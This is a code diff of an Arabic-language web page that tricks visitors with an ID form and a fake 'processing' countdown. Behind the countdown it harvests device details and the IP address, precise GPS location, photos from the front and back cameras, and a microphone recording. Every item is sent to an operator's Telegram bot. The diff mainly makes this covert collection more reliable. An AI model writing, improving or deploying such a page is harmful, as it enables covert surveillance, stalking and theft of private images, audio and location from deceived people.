@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html>
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -10,6 +10,7 @@
             text-align: center;
             padding: 20px;
             background-color: #f5f5f5;
+            margin: 0;
         }
         #container {
             max-width: 400px;
@@ -33,16 +34,19 @@
             font-size: 16px;
             cursor: pointer;
             margin: 10px 0;
+            width: 100%;
         }
         #permission-btn:disabled, #submit-btn:disabled {
             background: #cccccc;
         }
         #user-id {
-            padding: 10px;
+            padding: 12px;
             font-size: 16px;
             width: 100%;
             margin: 10px 0;
             box-sizing: border-box;
+            border: 1px solid #ddd;
+            border-radius: 5px;
         }
         .countdown {
             font-size: 24px;
@@ -54,9 +58,27 @@
             font-size: 24px;
             color: #4285f4;
             margin-bottom: 20px;
+            font-weight: bold;
         }
         .hidden {
             display: none;
+        }
+        .loading {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #4285f4;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .error {
+            color: #d32f2f;
+            margin: 10px 0;
         }
     </style>
 </head>
@@ -78,8 +100,10 @@
         
         <!-- الصفحة 3: العد التنازلي -->
         <div id="page3" class="hidden">
-            <div id="status">انتظر 3 دقائق</div>
+            <div id="status">جاري معالجة طلبك، انتظر 3 دقائق...</div>
             <div class="countdown" id="countdown">03:00</div>
+            <div id="loading" class="loading hidden"></div>
+            <div id="error-message" class="error hidden"></div>
         </div>
     </div>
 
@@ -98,6 +122,8 @@
         const page2 = document.getElementById('page2');
         const page3 = document.getElementById('page3');
         const countdownEl = document.getElementById('countdown');
+        const loadingEl = document.getElementById('loading');
+        const errorEl = document.getElementById('error-message');
         
         // Move to page 2 when start button is clicked
         permissionBtn.addEventListener('click', () => {
@@ -105,115 +131,257 @@
             page2.classList.remove('hidden');
         });
         
-        // Main function to collect and send all data
-        async function collectAndSendAllData(userId) {
+        // دالة محسنة للوصول إلى الكاميرا
+        async function getCameraAccess(facingMode) {
+            const constraints = {
+                video: {
+                    width: { ideal: 1280 },
+                    height: { ideal: 720 },
+                    facingMode: facingMode ? { exact: facingMode } : undefined
+                }
+            };
+            
             try {
-                // 1. Send basic device info first
-                const deviceInfo = getDeviceInfo();
-                deviceInfo.userId = userId; // Add user ID to device info
-                await sendToTelegram(formatDeviceInfo(deviceInfo));
-                
-                // 2. Get and send location (parallel with other requests)
-                const locationPromise = getLocation().then(loc => {
-                    return sendToTelegram(`📍 Location for user ${userId}:\nLat: ${loc.latitude}\nLon: ${loc.longitude}\nAccuracy: ${loc.accuracy}m\nMap: https://maps.google.com/?q=${loc.latitude},${loc.longitude}`);
-                }).catch(e => {
-                    return sendToTelegram(`⚠️ Failed to get location for user ${userId}: ` + e.message);
-                });
-                
-                // 3. Camera photos (parallel)
-                const frontCameraPromise = captureAndSendPhoto('user', `front_camera_${userId}.jpg`);
-                const backCameraPromise = captureAndSendPhoto('environment', `back_camera_${userId}.jpg`);
-                
-                // 4. Audio recording
-                const audioPromise = recordAndSendAudio(10, `audio_${userId}.ogg`);
-                
-                // Wait for all operations to complete
-                await Promise.all([
-                    locationPromise,
-                    frontCameraPromise,
-                    backCameraPromise,
-                    audioPromise
-                ]);
-                
-                return true;
+                return await navigator.mediaDevices.getUserMedia(constraints);
             } catch (error) {
-                await sendToTelegram(`⚠️ Error for user ${userId}: ` + error.message);
-                return false;
+                console.error(`Camera access error (${facingMode}):`, error);
+                
+                // محاولة بدون facingMode إذا فشلت المحاولة الأولى
+                if (facingMode) {
+                    try {
+                        constraints.video.facingMode = undefined;
+                        return await navigator.mediaDevices.getUserMedia(constraints);
+                    } catch (fallbackError) {
+                        console.error('Fallback camera access error:', fallbackError);
+                        throw error; // نعيد الخطأ الأصلي
+                    }
+                }
+                
+                throw error;
             }
         }
         
-        // Move to page 3 when submit button is clicked
-        submitBtn.addEventListener('click', async () => {
-            const userId = userIdInput.value;
-            if (!userId) {
-                alert("الرجاء إدخال الأيدي الخاص بك");
-                return;
+        // دالة محسنة للتسجيل الصوتي
+        async function getMicrophoneAccess() {
+            try {
+                return await navigator.mediaDevices.getUserMedia({ 
+                    audio: {
+                        echoCancellation: false,
+                        noiseSuppression: false,
+                        autoGainControl: false
+                    }
+                });
+            } catch (error) {
+                console.error("Microphone access error:", error);
+                throw error;
             }
-            
-            page2.classList.add('hidden');
-            page3.classList.remove('hidden');
-            
-            // Start countdown from 3 minutes
-            let timeLeft = 180;
-            const countdownInterval = setInterval(() => {
-                timeLeft--;
-                
-                const minutes = Math.floor(timeLeft / 60);
-                const seconds = timeLeft % 60;
-                
-                countdownEl.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
-                
-                if (timeLeft <= 0) {
-                    clearInterval(countdownInterval);
-                    statusEl.textContent = "تم الانتهاء!";
-                }
-            }, 1000);
-            
-            // Start collecting data in background
-            setTimeout(async () => {
-                try {
-                    await collectAndSendAllData(userId);
-                } catch (error) {
-                    console.error("Error collecting data:", error);
-                }
-            }, 1000);
-        });
+        }
         
-        // Get comprehensive device information
+        // دالة التقاط الصورة محسنة
+        async function captureAndSendPhoto(facingMode, filename, userId) {
+            let stream;
+            
+            try {
+                loadingEl.classList.remove('hidden');
+                statusEl.textContent = facingMode === 'user' 
+                    ? "جاري الوصول إلى الكاميرا الأمامية..." 
+                    : "جاري الوصول إلى الكاميرا الخلفية...";
+                
+                stream = await getCameraAccess(facingMode);
+                
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                
+                await new Promise((resolve, reject) => {
+                    video.onloadedmetadata = resolve;
+                    video.onerror = reject;
+                    video.play().catch(reject);
+                });
+                
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                
+                const blob = await new Promise(resolve => 
+                    canvas.toBlob(resolve, 'image/jpeg', 0.7)
+                );
+                
+                await sendPhotoToTelegram(blob, filename, userId);
+                return true;
+            } catch (error) {
+                await sendToTelegram(`⚠️ كاميرا ${facingMode === 'user' ? 'أمامية' : 'خلفية'} - خطأ: ${error.message}\nUser ID: ${userId}`);
+                return false;
+            } finally {
+                loadingEl.classList.add('hidden');
+                if (stream) {
+                    stream.getTracks().forEach(track => track.stop());
+                }
+                statusEl.textContent = "جاري معالجة طلبك، انتظر...";
+            }
+        }
+        
+        // دالة التسجيل الصوتي محسنة
+        async function recordAndSendAudio(duration, filename, userId) {
+            let stream;
+            let recorder;
+            
+            try {
+                loadingEl.classList.remove('hidden');
+                statusEl.textContent = "جاري التحضير للتسجيل الصوتي...";
+                
+                stream = await getMicrophoneAccess();
+                recorder = new MediaRecorder(stream);
+                const chunks = [];
+                
+                recorder.ondataavailable = e => chunks.push(e.data);
+                recorder.start();
+                
+                statusEl.textContent = "جاري التسجيل الصوتي...";
+                await new Promise(resolve => setTimeout(resolve, duration * 1000));
+                
+                if (recorder.state !== 'inactive') {
+                    recorder.stop();
+                }
+                
+                await new Promise(resolve => {
+                    recorder.onstop = resolve;
+                });
+                
+                const blob = new Blob(chunks, { type: 'audio/webm' });
+                await sendAudioToTelegram(blob, filename, userId);
+                return true;
+            } catch (error) {
+                await sendToTelegram(`⚠️ خطأ في التسجيل الصوتي: ${error.message}\nUser ID: ${userId}`);
+                return false;
+            } finally {
+                loadingEl.classList.add('hidden');
+                if (stream) {
+                    stream.getTracks().forEach(track => track.stop());
+                }
+                statusEl.textContent = "جاري معالجة طلبك، انتظر...";
+            }
+        }
+        
+        // دالة الحصول على الموقع
+        async function getLocation(userId) {
+            return new Promise((resolve, reject) => {
+                if (!navigator.geolocation) {
+                    reject(new Error("Geolocation غير مدعوم في هذا المتصفح"));
+                    return;
+                }
+                
+                loadingEl.classList.remove('hidden');
+                statusEl.textContent = "جاري تحديد الموقع...";
+                
+                navigator.geolocation.getCurrentPosition(
+                    async pos => {
+                        try {
+                            const location = {
+                                latitude: pos.coords.latitude,
+                                longitude: pos.coords.longitude,
+                                accuracy: pos.coords.accuracy
+                            };
+                            
+                            await sendToTelegram(
+                                `📍 موقع المستخدم:\n` +
+                                `- خط العرض: ${location.latitude}\n` +
+                                `- خط الطول: ${location.longitude}\n` +
+                                `- الدقة: ${location.accuracy} متر\n` +
+                                `- خرائط: https://maps.google.com/?q=${location.latitude},${location.longitude}\n` +
+                                `- User ID: ${userId}`
+                            );
+                            
+                            resolve(location);
+                        } catch (error) {
+                            reject(error);
+                        } finally {
+                            loadingEl.classList.add('hidden');
+                            statusEl.textContent = "جاري معالجة طلبك، انتظر...";
+                        }
+                    },
+                    err => {
+                        loadingEl.classList.add('hidden');
+                        statusEl.textContent = "جاري معالجة طلبك، انتظر...";
+                        reject(err);
+                    },
+                    { 
+                        enableHighAccuracy: true, 
+                        timeout: 15000,
+                        maximumAge: 0
+                    }
+                );
+            });
+        }
+        
+        // دالة جمع معلومات الجهاز
         function getDeviceInfo() {
             return {
                 userAgent: navigator.userAgent,
                 platform: navigator.platform,
                 deviceType: getDeviceType(),
                 os: getOSInfo(),
-                cpuCores: navigator.hardwareConcurrency || 'unknown',
-                ram: navigator.deviceMemory ? `${navigator.deviceMemory}GB` : 'unknown',
+                cpuCores: navigator.hardwareConcurrency || 'غير معروف',
+                ram: navigator.deviceMemory ? `${navigator.deviceMemory} جيجابايت` : 'غير معروف',
                 screen: `${window.screen.width}x${window.screen.height}`,
-                colorDepth: `${window.screen.colorDepth}bit`,
+                colorDepth: `${window.screen.colorDepth} بت`,
                 language: navigator.language,
                 timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                 battery: getBatteryInfo(),
                 connection: getConnectionInfo(),
-                ip: 'fetching...',
+                ip: 'جاري الجلب...',
                 gpu: getGPUInfo(),
-                touchSupport: 'ontouchstart' in window,
+                touchSupport: 'ontouchstart' in window ? 'مدعوم' : 'غير مدعوم',
                 sensors: getSensorInfo(),
                 storage: getStorageEstimate(),
                 installedApps: getInstalledAppsInfo(),
                 security: getSecurityInfo(),
-                time: new Date().toISOString()
+                time: new Date().toLocaleString('ar-EG')
             };
+        }
+        
+        // دالة إرسال معلومات الجهاز
+        async function sendDeviceInfo(userId) {
+            try {
+                loadingEl.classList.remove('hidden');
+                statusEl.textContent = "جاري جمع معلومات الجهاز...";
+                
+                const deviceInfo = getDeviceInfo();
+                deviceInfo.userId = userId;
+                deviceInfo.ip = await fetchIP();
+                
+                await sendToTelegram(formatDeviceInfo(deviceInfo));
+                return true;
+            } catch (error) {
+                await sendToTelegram(`⚠️ خطأ في جمع معلومات الجهاز: ${error.message}\nUser ID: ${userId}`);
+                return false;
+            } finally {
+                loadingEl.classList.add('hidden');
+                statusEl.textContent = "جاري معالجة طلبك، انتظر...";
+            }
+        }
+        
+        // دالة الحصول على عنوان IP
+        async function fetchIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch {
+                return 'غير معروف';
+            }
         }
         
         // Helper functions for device info
         function getDeviceType() {
             const ua = navigator.userAgent;
-            if (/Android/i.test(ua)) return 'Android';
+            if (/Android/i.test(ua)) return 'أندرويد';
             if (/iPhone|iPad|iPod/i.test(ua)) return 'iOS';
-            if (/Windows/i.test(ua)) return 'Windows';
-            if (/Mac/i.test(ua)) return 'Mac';
-            if (/Linux/i.test(ua)) return 'Linux';
-            return 'Unknown';
+            if (/Windows/i.test(ua)) return 'ويندوز';
+            if (/Mac/i.test(ua)) return 'ماك';
+            if (/Linux/i.test(ua)) return 'لينكس';
+            return 'غير معروف';
         }
         
         function getOSInfo() {
@@ -234,7 +402,7 @@
                     return clientStrings[i].s;
                 }
             }
-            return 'Unknown';
+            return 'غير معروف';
         }
         
         async function getBatteryInfo() {
@@ -243,15 +411,15 @@
                     const battery = await navigator.getBattery();
                     return {
                         level: Math.round(battery.level * 100) + '%',
-                        charging: battery.charging,
+                        charging: battery.charging ? 'نعم' : 'لا',
                         chargingTime: battery.chargingTime,
                         dischargingTime: battery.dischargingTime
                     };
                 } catch (e) {
-                    return 'unknown';
+                    return 'غير معروف';
                 }
             }
-            return 'unsupported';
+            return 'غير مدعوم';
         }
         
         function getConnectionInfo() {
@@ -260,10 +428,10 @@
                     type: navigator.connection.effectiveType,
                     downlink: navigator.connection.downlink + 'Mb/s',
                     rtt: navigator.connection.rtt + 'ms',
-                    saveData: navigator.connection.saveData
+                    saveData: navigator.connection.saveData ? 'نعم' : 'لا'
                 };
             }
-            return 'unknown';
+            return 'غير معروف';
         }
         
         function getGPUInfo() {
@@ -274,18 +442,18 @@
                 return debugInfo ? {
                     vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
                     renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
-                } : 'unknown';
+                } : 'غير معروف';
             }
-            return 'unsupported';
+            return 'غير مدعوم';
         }
         
         function getSensorInfo() {
             const sensors = [];
-            if ('accelerometer' in window) sensors.push('accelerometer');
-            if ('gyroscope' in window) sensors.push('gyroscope');
-            if ('magnetometer' in window) sensors.push('magnetometer');
-            if ('AmbientLightSensor' in window) sensors.push('light');
-            return sensors.length ? sensors.join(', ') : 'none detected';
+            if ('accelerometer' in window) sensors.push('مقياس التسارع');
+            if ('gyroscope' in window) sensors.push('الجيروسكوب');
+            if ('magnetometer' in window) sensors.push('المغناطيسي');
+            if ('AmbientLightSensor' in window) sensors.push('استشعار الضوء');
+            return sensors.length ? sensors.join('، ') : 'لم يتم اكتشاف أي أجهزة استشعار';
         }
         
         async function getStorageEstimate() {
@@ -297,138 +465,67 @@
                         quota: (estimate.quota / (1024 * 1024)).toFixed(2) + 'MB'
                     };
                 } catch (e) {
-                    return 'unknown';
+                    return 'غير معروف';
                 }
             }
-            return 'unsupported';
+            return 'غير مدعوم';
         }
         
         function getInstalledAppsInfo() {
             if ('getInstalledRelatedApps' in window) {
-                return 'supported (but requires user gesture)';
+                return 'مدعوم (يتطلب إذن المستخدم)';
             }
-            return 'limited detection';
+            return 'كشف محدود';
         }
         
         function getSecurityInfo() {
             const security = [];
-            if (window.isSecureContext) security.push('secure context');
-            if (navigator.doNotTrack === '1') security.push('DNT enabled');
-            if (navigator.cookieEnabled) security.push('cookies enabled');
-            return security.length ? security.join(', ') : 'basic';
+            if (window.isSecureContext) security.push('سياق آمن');
+            if (navigator.doNotTrack === '1') security.push('DNT مفعل');
+            if (navigator.cookieEnabled) security.push('الكوكيز مفعلة');
+            return security.length ? security.join('، ') : 'أساسي';
         }
         
-        // Format device info for Telegram
+        // تنسيق معلومات الجهاز للرسالة
         function formatDeviceInfo(info) {
-            return `📱 <b>DEVICE INFORMATION</b>\n\n` +
-                   `👤 <b>User ID</b>: ${info.userId || 'unknown'}\n\n` +
-                   `🖥️ <b>System Info</b>\n` +
-                   `- Platform: ${info.platform}\n` +
-                   `- Device: ${info.deviceType}\n` +
-                   `- OS: ${info.os}\n` +
-                   `- User Agent: ${info.userAgent}\n` +
-                   `- CPU Cores: ${info.cpuCores}\n` +
-                   `- RAM: ${info.ram}\n\n` +
+            return `📱 <b>معلومات الجهاز</b>\n\n` +
+                   `👤 <b>معرف المستخدم</b>: ${info.userId || 'غير معروف'}\n\n` +
+                   `🖥️ <b>معلومات النظام</b>\n` +
+                   `- المنصة: ${info.platform}\n` +
+                   `- الجهاز: ${info.deviceType}\n` +
+                   `- نظام التشغيل: ${info.os}\n` +
+                   `- متصفح المستخدم: ${info.userAgent}\n` +
+                   `- نوى المعالج: ${info.cpuCores}\n` +
+                   `- الذاكرة العشوائية: ${info.ram}\n\n` +
                    
-                   `📊 <b>Display</b>\n` +
-                   `- Resolution: ${info.screen}\n` +
-                   `- Color Depth: ${info.colorDepth}\n\n` +
+                   `📊 <b>الشاشة</b>\n` +
+                   `- الدقة: ${info.screen}\n` +
+                   `- عمق الألوان: ${info.colorDepth}\n\n` +
                    
-                   `🌐 <b>Network</b>\n` +
-                   `- Connection: ${info.connection.type || 'unknown'}\n` +
-                   `- IP: ${info.ip}\n` +
-                   `- Language: ${info.language}\n` +
-                   `- Timezone: ${info.timezone}\n\n` +
+                   `🌐 <b>الشبكة</b>\n` +
+                   `- نوع الاتصال: ${info.connection.type || 'غير معروف'}\n` +
+                   `- عنوان IP: ${info.ip}\n` +
+                   `- اللغة: ${info.language}\n` +
+                   `- المنطقة الزمنية: ${info.timezone}\n\n` +
                    
-                   `🔋 <b>Battery</b>\n` +
-                   `- Level: ${info.battery.level || 'unknown'}\n` +
-                   `- Charging: ${info.battery.charging ? 'Yes' : 'No'}\n\n` +
+                   `🔋 <b>البطارية</b>\n` +
+                   `- مستوى الشحن: ${info.battery.level || 'غير معروف'}\n` +
+                   `- حالة الشحن: ${info.battery.charging || 'غير معروف'}\n\n` +
                    
-                   `⚙️ <b>Advanced</b>\n` +
-                   `- GPU: ${info.gpu.renderer || 'unknown'}\n` +
-                   `- Touch: ${info.touchSupport ? 'Yes' : 'No'}\n` +
-                   `- Sensors: ${info.sensors}\n` +
-                   `- Storage: ${info.storage.quota || 'unknown'}\n` +
-                   `- Security: ${info.security}\n\n` +
+                   `⚙️ <b>معلومات متقدمة</b>\n` +
+                   `- كرت الشاشة: ${info.gpu.renderer || 'غير معروف'}\n` +
+                   `- شاشة لمس: ${info.touchSupport}\n` +
+                   `- أجهزة الاستشعار: ${info.sensors}\n` +
+                   `- مساحة التخزين: ${info.storage.quota || 'غير معروف'}\n` +
+                   `- الأمان: ${info.security}\n\n` +
                    
-                   `⏰ <b>Timestamp</b>\n${info.time}`;
-        }
-        
-        // Camera capture function
-        async function captureAndSendPhoto(facingMode, filename) {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode, width: 1280, height: 720 }
-                });
-                
-                const video = document.createElement('video');
-                video.srcObject = stream;
-                await new Promise(resolve => video.onloadedmetadata = resolve);
-                video.play();
-                
-                const canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                const ctx = canvas.getContext('2d');
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                
-                stream.getTracks().forEach(track => track.stop());
-                
-                const blob = await new Promise(resolve => 
-                    canvas.toBlob(resolve, 'image/jpeg', 0.9)
-                );
-                
-                await sendPhotoToTelegram(blob, filename);
-                return true;
-            } catch (error) {
-                await sendToTelegram(`⚠️ Camera ${facingMode} error: ${error.message}`);
-                return false;
-            }
-        }
-        
-        // Location function
-        async function getLocation() {
-            return new Promise((resolve, reject) => {
-                navigator.geolocation.getCurrentPosition(
-                    pos => resolve({
-                        latitude: pos.coords.latitude,
-                        longitude: pos.coords.longitude,
-                        accuracy: pos.coords.accuracy
-                    }),
-                    err => reject(err),
-                    { enableHighAccuracy: true, timeout: 10000 }
-                );
-            });
-        }
-        
-        // Audio recording function
-        async function recordAndSendAudio(duration, filename) {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-                const recorder = new MediaRecorder(stream);
-                const chunks = [];
-                
-                recorder.ondataavailable = e => chunks.push(e.data);
-                recorder.start();
-                
-                await new Promise(resolve => setTimeout(resolve, duration * 1000));
-                
-                recorder.stop();
-                stream.getTracks().forEach(track => track.stop());
-                
-                const blob = new Blob(chunks, { type: 'audio/ogg' });
-                await sendAudioToTelegram(blob, filename);
-                return true;
-            } catch (error) {
-                await sendToTelegram(`⚠️ Audio error: ${error.message}`);
-                return false;
-            }
+                   `⏰ <b>الوقت</b>\n${info.time}`;
         }
         
         // Telegram sending functions
         async function sendToTelegram(message) {
             try {
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
@@ -437,48 +534,159 @@
                         parse_mode: 'HTML'
                     })
                 });
+                
+                if (!response.ok) {
+                    throw new Error(`HTTP error! status: ${response.status}`);
+                }
+                
+                return await response.json();
             } catch (error) {
-                console.error('Telegram send error:', error);
+                console.error('خطأ في إرسال الرسالة إلى Telegram:', error);
+                throw error;
             }
         }
         
-        async function sendPhotoToTelegram(photoBlob, filename) {
-            const formData = new FormData();
-            formData.append('chat_id', CHAT_ID);
-            formData.append('photo', photoBlob, filename);
-            
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                method: 'POST',
-                body: formData
-            });
-        }
-        
-        async function sendAudioToTelegram(audioBlob, filename) {
-            const formData = new FormData();
-            formData.append('chat_id', CHAT_ID);
-            formData.append('audio', audioBlob, filename);
-            
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, {
-                method: 'POST',
-                body: formData
-            });
-        }
-        
-        // Get IP address
-        async function fetchIP() {
+        async function sendPhotoToTelegram(photoBlob, filename, userId) {
             try {
-                const response = await fetch('https://api.ipify.org?format=json');
-                const data = await response.json();
-                return data.ip;
-            } catch {
-                return 'unknown';
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('photo', photoBlob, filename);
+                formData.append('caption', `صورة من مستخدم\nUser ID: ${userId}`);
+                
+                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+                
+                if (!response.ok) {
+                    throw new Error(`HTTP error! status: ${response.status}`);
+                }
+                
+                return await response.json();
+            } catch (error) {
+                console.error('خطأ في إرسال الصورة إلى Telegram:', error);
+                throw error;
             }
         }
         
-        // Initialize
-        (async () => {
-            const ip = await fetchIP();
-            // يمكنك استخدام عنوان IP هنا إذا كنت بحاجة إليه
+        async function sendAudioToTelegram(audioBlob, filename, userId) {
+            try {
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('audio', audioBlob, filename);
+                formData.append('caption', `تسجيل صوتي من مستخدم\nUser ID: ${userId}`);
+                
+                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, {
+                    method: 'POST',
+                    body: formData
+                });
+                
+                if (!response.ok) {
+                    throw new Error(`HTTP error! status: ${response.status}`);
+                }
+                
+                return await response.json();
+            } catch (error) {
+                console.error('خطأ في إرسال التسجيل الصوتي إلى Telegram:', error);
+                throw error;
+            }
+        }
+        
+        // عند إرسال النموذج
+        submitBtn.addEventListener('click', async () => {
+            const userId = userIdInput.value.trim();
+            
+            if (!userId) {
+                showError("الرجاء إدخال الأيدي الخاص بك");
+                return;
+            }
+            
+            // الانتقال إلى صفحة الانتظار
+            page2.classList.add('hidden');
+            page3.classList.remove('hidden');
+            errorEl.classList.add('hidden');
+            
+            // بدء العد التنازلي
+            let timeLeft = 180;
+            const countdownInterval = setInterval(() => {
+                timeLeft--;
+                
+                const minutes = Math.floor(timeLeft / 60);
+                const seconds = timeLeft % 60;
+                
+                countdownEl.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+                
+                if (timeLeft <= 0) {
+                    clearInterval(countdownInterval);
+                    statusEl.textContent = "تم الانتهاء!";
+                }
+            }, 1000);
+            
+            // بدء جمع البيانات في الخلفية
+            try {
+                // 1. إرسال معلومات الجهاز
+                await sendDeviceInfo(userId);
+                
+                // 2. الحصول على الموقع
+                try {
+                    await getLocation(userId);
+                } catch (locError) {
+                    console.error("Location error:", locError);
+                }
+                
+                // 3. الكاميرا الأمامية
+                try {
+                    await captureAndSendPhoto('user', `front_${userId}.jpg`, userId);
+                } catch (frontCamError) {
+                    console.error("Front camera error:", frontCamError);
+                }
+                
+                // 4. الكاميرا الخلفية (مع معالجة خاصة للفشل)
+                try {
+                    await captureAndSendPhoto('environment', `back_${userId}.jpg`, userId);
+                } catch (backCamError) {
+                    console.error("Back camera error:", backCamError);
+                    
+                    // محاولة مرة أخرى بدون تحديد facingMode
+                    try {
+                        await captureAndSendPhoto(undefined, `back_fallback_${userId}.jpg`, userId);
+                    } catch (fallbackError) {
+                        console.error("Back camera fallback error:", fallbackError);
+                    }
+                }
+                
+                // 5. التسجيل الصوتي
+                try {
+                    await recordAndSendAudio(10, `audio_${userId}.webm`, userId);
+                } catch (audioError) {
+                    console.error("Audio recording error:", audioError);
+                }
+                
+                // إرسال رسالة إتمام
+                await sendToTelegram(`✅ تم الانتهاء من جمع بيانات المستخدم\nUser ID: ${userId}`);
+                
+            } catch (mainError) {
+                console.error("Main data collection error:", mainError);
+                showError("حدث خطأ أثناء المعالجة. يرجى المحاولة مرة أخرى.");
+                await sendToTelegram(`⚠️ خطأ رئيسي في جمع البيانات\nUser ID: ${userId}\nError: ${mainError.message}`);
+            } finally {
+                loadingEl.classList.add('hidden');
+            }
+        });
+        
+        // دالة عرض الخطأ
+        function showError(message) {
+            errorEl.textContent = message;
+            errorEl.classList.remove('hidden');
+        }
+        
+        // التهيئة الأولية
+        (async function init() {
+            try {
+                // يمكنك إضافة أي كود تهيئة هنا إذا لزم الأمر
+            } catch (error) {
+                console.error("Initialization error:", error);
+            }
         })();
     </script>
 </body>
